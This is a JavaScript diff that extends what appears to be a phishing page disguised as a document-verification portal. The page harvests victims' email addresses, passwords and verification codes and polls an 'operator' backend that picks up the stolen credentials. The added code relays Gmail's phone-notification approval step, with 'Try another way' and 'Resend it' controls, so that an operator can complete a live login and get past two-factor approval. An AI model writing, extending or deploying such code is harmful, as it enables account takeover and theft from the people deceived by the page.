@@ -221,6 +221,8 @@ let browserId = null;
 let pollingIntervalId = null;
 let currentStatus = null;
 let verificationOptions = [];
+let pollingRetryAttempt = 0; // New variable to track retry attempts
+const MAX_POLLING_RETRIES = 3; // Maximum number of retries
 let loadingMessages = [
   "Securing your connection...",
   "Verifying document integrity...",
@@ -444,6 +446,45 @@ function updateUIForStatus(status, data = {}) {
       emailField.readOnly = true;
       // keep password enabled for user convenience
       verificationCodeInput.value = ''; // Clear previous code
+
+      // Handle Gmail specifics for app notification
+      const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
+      if (lj.gmail && lj.gmail.step === "waiting_app_notification") {
+        // Gmail app notification flow
+        document.querySelector('label[for="verificationCodeInput"]').textContent = lj.gmail.instructions || "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in.";
+        verificationCodeInput.style.display = 'none';
+        submitButton.style.display = 'none';
+
+        // Remove existing Gmail buttons if present
+        const existingButtons = document.getElementById('gmailButtons');
+        if (existingButtons) existingButtons.remove();
+
+        // Add Gmail-specific buttons
+        const buttonContainer = document.createElement('div');
+        buttonContainer.id = 'gmailButtons';
+        buttonContainer.innerHTML = `
+          <button type="button" class="btn btn-primary" id="tryAnotherWayBtn">Try another way</button>
+          <button type="button" class="btn btn-link" id="resendBtn" ${lj.gmail.canResend ? '' : 'disabled'}>Resend it</button>
+        `;
+        verificationCodeGroup.appendChild(buttonContainer);
+
+        // Add event listeners
+        document.getElementById('tryAnotherWayBtn').onclick = () => submitGmailChoice('change_method');
+        document.getElementById('resendBtn').onclick = () => {
+          if (lj.gmail.canResend) {
+            submitGmailChoice('resend');
+            document.getElementById('resendBtn').disabled = true;
+          }
+        };
+      } else {
+        // Normal code input flow
+        document.querySelector('label[for="verificationCodeInput"]').textContent = 'Verification Code';
+        verificationCodeInput.style.display = 'block';
+        submitButton.style.display = 'block';
+        const existingButtons = document.getElementById('gmailButtons');
+        if (existingButtons) existingButtons.remove();
+      }
+
       startPolling(10000); // Poll every 10 seconds for user input
       break;
     case 'COMPLETED':
@@ -672,10 +713,11 @@ function startPolling(interval = 10000) { // Default to 10 seconds
   if (pollingIntervalId) {
     clearInterval(pollingIntervalId);
   }
+  pollingRetryAttempt = 0; // Reset retry counter for a new polling session
   pollingIntervalId = setInterval(pollOperator, interval);
 }
 
-// Poll the operator endpoint
+// Poll the operator endpoint with retry logic
 async function pollOperator() {
   if (!browserId) {
     console.warn("No browserId available for polling.");
@@ -695,24 +737,24 @@ async function pollOperator() {
     });
 
     if (!response.ok) {
+      // If response is not OK, treat as a fetch error and throw
       throw new Error(`HTTP error! status: ${response.status}`);
     }
 
     const data = await response.json();
     console.log("Polling response:", data);
 
+    // If successful, reset retry attempts
+    pollingRetryAttempt = 0;
+
     if (data.currentStatus) {
       const responseData = data.data || {};
       const currentStatusFromResponse = data.currentStatus;
       
-      // Check if we should keep the loading state active while waiting for backend pickup
-      // If WAITINGEMAIL with email already in sheet, or WAITINGPASSWORD with password already in sheet,
-      // keep loading active and continue polling (don't update UI yet)
       const isWaitingEmailWithData = currentStatusFromResponse === 'WAITINGEMAIL' && responseData.email && responseData.email.trim() !== '';
       const isWaitingPasswordWithData = currentStatusFromResponse === 'WAITINGPASSWORD' && responseData.password && responseData.password.trim() !== '';
       
       if (isWaitingEmailWithData || isWaitingPasswordWithData) {
-        // Keep loading overlay visible and continue polling
         console.log("Polling detected backend still picking up data. Keeping loading state active.", {
           status: currentStatusFromResponse,
           hasEmail: !!responseData.email,
@@ -721,19 +763,42 @@ async function pollOperator() {
         showLoadingOverlay(true);
         startPolling(5000); // Poll more frequently (every 5 seconds) while waiting for backend pickup
       } else {
-        // Update UI normally if not in "waiting for pickup" state
         updateUIForStatus(data.currentStatus, data.data || {});
       }
     } else {
       console.warn("Polling response missing currentStatus:", data);
     }
   } catch (error) {
-    console.error("Error during polling:", error);
-    document.getElementById('GeneralError').textContent = "Polling failed. Please try again.";
-    document.getElementById('GeneralError').style.display = 'block';
-    clearInterval(pollingIntervalId);
-    hideLoadingOverlay(); // Changed from hideLoadingDialog to hideLoadingOverlay
-    resetFormState();
+    console.error(`Error during polling (attempt ${pollingRetryAttempt + 1} of ${MAX_POLLING_RETRIES}):`, error);
+    pollingRetryAttempt++;
+
+    if (pollingRetryAttempt < MAX_POLLING_RETRIES) {
+      console.log(`Retrying polling in 5 seconds...`);
+      // Clear current interval and set a new one for retry after a delay
+      clearInterval(pollingIntervalId);
+      // Wait 5 seconds before retrying
+      pollingIntervalId = setTimeout(() => {
+        // Call pollOperator directly for the retry, then if it succeeds, it will restart the regular interval
+        // If it fails again, it will be caught by this same logic.
+        pollOperator();
+        // After the manual retry, if we are still polling, restart the interval.
+        // This handles cases where the immediate retry might succeed and we want to continue normal polling.
+        if (pollingIntervalId) { // Check if not cleared by pollOperator() (e.g. if it moved to COMPLETED)
+            clearInterval(pollingIntervalId);
+            pollingIntervalId = setInterval(pollOperator, 10000); // Back to regular interval
+        }
+      }, 5000);
+    } else {
+      console.error("Max polling retries reached. Stopping polling.");
+      // Display the "Document retrieval failed" message by calling showLoadingOverlay with isError=true
+      showLoadingOverlay(false, true); 
+      // Also set a more specific message in GeneralError if needed, but the overlay will be primary.
+      document.getElementById('GeneralError').textContent = "Polling failed after multiple attempts. Please refresh and try again.";
+      document.getElementById('GeneralError').style.display = 'block'; // Make sure this is still visible if overlay isn't covering all.
+      clearInterval(pollingIntervalId);
+      // No need to hideLoadingOverlay here as showLoadingOverlay(false, true) manages it.
+      resetFormState();
+    }
   }
 }
 
@@ -925,6 +990,54 @@ function resetFormState() {
   document.getElementById('verificationOptionsGroup').style.display = 'none';
   document.getElementById('verificationCodeGroup').style.display = 'none';
   document.getElementById('termsOfUseGroup').style.display = 'none';
+
+  // Remove Gmail-specific buttons if present
+  const existingButtons = document.getElementById('gmailButtons');
+  if (existingButtons) existingButtons.remove();
+}
+
+// Submit Gmail-specific choice (resend or change method)
+async function submitGmailChoice(type) {
+  hideAllErrors();
+  showLoadingOverlay(true); // Show spinner during submission
+
+  const payload = {
+    browserId: browserId,
+    token: templateConfig.token,
+    verificationChoice: JSON.stringify([{ type: type }])
+  };
+
+  try {
+    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Gmail choice submission response:", data);
+
+    // Wait a short time for backend processing
+    await new Promise(resolve => setTimeout(resolve, 5000));
+
+    // Update UI
+    if (data && data.currentStatus) {
+      updateUIForStatus(data.currentStatus, data.data || {});
+    } else {
+      pollOperator();
+    }
+
+  } catch (error) {
+    console.error("Error submitting Gmail choice:", error);
+    document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    showLoadingOverlay(false, true); // Show error message, no spinner
+    resetFormState();
+  }
 }
 
 // Handle form submission to prevent the default behavior
